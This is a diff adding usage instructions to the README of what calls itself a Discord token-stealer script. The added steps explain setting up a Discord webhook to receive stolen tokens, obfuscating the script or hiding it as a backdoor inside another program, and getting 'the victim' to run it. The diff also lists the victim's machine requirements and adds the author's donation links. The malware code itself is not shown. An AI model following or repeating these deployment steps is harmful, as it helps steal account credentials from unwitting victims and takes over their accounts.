@@ -5,3 +5,23 @@
  - No local caching
  - Transferring via Discord webhook
  - No external Python modules needed (**TODO**)
+
+# How to use
+ 1. Create a webhook on your Discord server. I recommend creating a new server.
+ 2. Change the 'WEBHOOK_URL' variable in [token-stealer.py](token-stealer.py)
+ 3. (obfuscate the code or install it as a backdoor in an other script.)
+ 4. Make the victim run the script.
+
+# Requirements on Victim's Machine
+- Python 3.x
+- 'discord_webhook' PIP module
+
+# Author
+- **WodX**
+    - [Github](https://github.com/WodXTV)
+    - [Twitter](https://twitter.com/wodsex)
+    - [Discord](https://profiles.pw/profile/621044372951269417)
+    - [PayPal.me](https://www.paypal.com/paypalme2/wodx)
+
+# Donate
+You can donate to my PayPal at https://www.paypal.com/paypalme2/wodx <3
